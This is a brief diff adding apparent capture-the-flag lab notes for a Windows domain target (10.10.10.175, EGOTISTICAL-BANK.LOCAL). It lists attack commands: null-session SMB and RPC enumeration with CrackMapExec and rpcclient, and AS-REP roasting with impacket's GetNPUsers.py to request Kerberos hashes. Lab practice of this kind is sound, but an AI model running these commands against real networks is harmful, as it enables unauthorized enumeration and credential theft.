@@ -1,0 +1,11 @@
+cme smb 10.10.10.175 --pass-pol -u '' -p ''
+
+rpcclient -U '' 10.10.10.175
+
+kerborse
+
+/usr/share/doc/python3-impacket/example 
+
+./GetNPUsers.py -dc-ip 10.10.10.175 -request 'EGOTISTICAL-BANK.LOCAL/'
+
+
